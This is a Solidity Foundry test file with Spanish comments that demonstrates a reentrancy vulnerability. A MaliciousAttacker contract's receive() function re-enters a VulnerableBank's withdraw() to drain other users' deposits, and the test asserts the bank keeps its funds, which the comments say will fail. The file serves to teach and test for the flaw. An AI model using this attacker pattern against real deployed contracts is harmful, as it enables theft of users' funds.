// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/Reentrancy.sol";

// Contrato Atacante Clásico 
// (Fácil de entender e idéntico filosóficamente al de Medusa)
contract MaliciousAttacker {
    VulnerableBank public bank;

    constructor(address _target) {
        bank = VulnerableBank(_target);
    }

    // El atacante inyecta fondos legítimos para pasar el require(balance > 0)
    function deposit() external payable {
        bank.deposit{value: msg.value}();
    }

    // Detonador del ataque
    function attack() external {
        bank.withdraw();
    }

    // LA TRAMPA: Función asíncrona que explota el envío de saldo prematuro del Banco
    receive() external payable {
        // Mientras al banco le quede dinero (de otros usuarios honestos), seguimos reentrando
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}

contract ReentrancyTest is Test {
    VulnerableBank bank;
    MaliciousAttacker attacker;

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new MaliciousAttacker(address(bank));

        // 1. Simular la vida real: Un Usuario Honesto deposita 10 ether en el banco
        vm.deal(address(0x1), 10 ether);
        vm.prank(address(0x1));
        bank.deposit{value: 10 ether}();
    }

    function test_bank_is_secure() public {
        // 2. El Atacante se financia con 1 ether propio y lo deposita en el banco
        vm.deal(address(attacker), 1 ether);
        attacker.deposit{value: 1 ether}();

        // 3. El Atacante detona el robot asíncrono ordenando un retiro normal
        // E intenta sacar su dinero
        attacker.attack();

        // 4. PRUEBA DE SEGURIDAD (Se supone que el banco DEBE ser seguro)
        // El banco debería conservar intactos los 10 ether del usuario honesto.
        // Como el atacante lo va a robar todo, esta línea FRACASARÁ, pintando el [FAIL] rojo
        assertEq(address(bank).balance, 10 ether, "Peligro de Vulnerabilidad: El banco ha perdido el dinero de los usuarios");
    }
}
